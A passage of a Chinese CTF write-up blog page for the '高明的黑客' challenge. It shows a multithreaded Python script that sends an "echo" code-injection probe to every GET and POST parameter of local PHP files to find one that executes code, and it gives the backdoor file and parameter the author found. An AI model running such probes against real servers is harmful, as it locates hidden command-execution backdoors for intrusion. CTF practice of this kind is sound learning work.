class="comment"># 这段代码只是为了看起来好看</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>) <span class="comment"># 设置最大线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy_pro/www/src&quot;</span></span><br><span class="line">os.chdir(filePath) <span class="comment"># 改变当前工作目录为源代码的目录</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span> <span class="comment"># requests.adapters.DEFAULT_RETRIES是Python第三方库requests中的一个常量，它表示在请求失败时，requests库将尝试重新发送请求的次数</span></span><br><span class="line">files = os.listdir(filePath) <span class="comment"># 得到该目录下的所有文件名称</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False，避免每个请求重用相同的TCP连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire() <span class="comment"># 设置线程锁</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span> + file + <span class="string">&#x27;     &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="comment"># 更好看</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># 获取文件中$_GET参数和$_POST参数</span></span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line"></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxxx&#x27;;&quot;</span> <span class="comment"># 将所有参数值设置为echo &#x27;xxxxxxx&#x27;;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + file</span><br><span class="line">    req = session.post(url,data=data,params=params) <span class="comment"># 请求所有的GET和POST</span></span><br><span class="line">    req.close() <span class="comment"># 关闭请求，释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url + <span class="string">&#x27;?%s=&#x27;</span> % a + <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()  <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b: <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()  <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:  <span class="comment"># flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span> + file + <span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> % param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()  <span class="comment"># 关锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:</span><br><span class="line">    t = threading.Thread(target=get_content,args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+
+<p>但是很奇怪，自己没跑出来</p>
+<p>跑出来是xk0SzyKwfzw.php?Efa5BVG</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/04/5-4%E6%97%A5%E5%B8%B8/" rel="prev" title="5.4日常">
+      <i class="fa fa-chevron-left"></i> 5.4日常
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/08/5-8%E6%97%A5%E5%B8%B8/" rel="next" title="5-8日常">
+      5-8日常 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HZNUCTF-2023-preliminary-pickle"><span class="nav-number">1.</span> <span class="nav-text">[HZNUCTF 2023 preliminary]pickle</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">预期</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSRound-6-Team-check-V1"><span class="nav-number">2.</span> <span class="nav-text">[NSSRound#6 Team]check(V1)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="nav-number">3.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="nav-number">3.1.</span> <span class="nav-text">python多线程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">线程的概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="nav-number">3.1.0.2.</span> <span class="nav-text">创建多线程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E7%BA%BF%E7%A8%8B"><span class="nav-number">3.1.0.3.</span> <span class="nav-text">主线程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E9%94%81"><span class="nav-number">3.1.0.4.</span> <span class="nav-text">线程锁</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ycxlo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ycxlo</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
